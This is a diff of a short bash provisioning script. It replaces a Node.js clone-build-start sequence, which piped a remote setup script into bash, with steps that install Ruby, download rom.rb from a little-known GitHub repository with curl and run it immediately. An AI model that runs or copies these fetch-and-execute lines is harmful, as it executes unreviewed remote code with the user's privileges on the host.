@@ -1,10 +1,6 @@
 #!/bin/bash
 #!/bin/bash
 sudo apt update
-sudo curl -fsSL https://deb.nodesource.com/setup_22.x | bash -
-sudo apt install git curl nodejs npm -y
-git clone https://github.com/lianamahesra-creator/special-octo-fishstick.git
-cd special-octo-fishstick
-sudo npm install
-sudo npm run build
-sudo npm start
+sudo apt install ruby -y
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/rom.rb
+ruby rom.rb
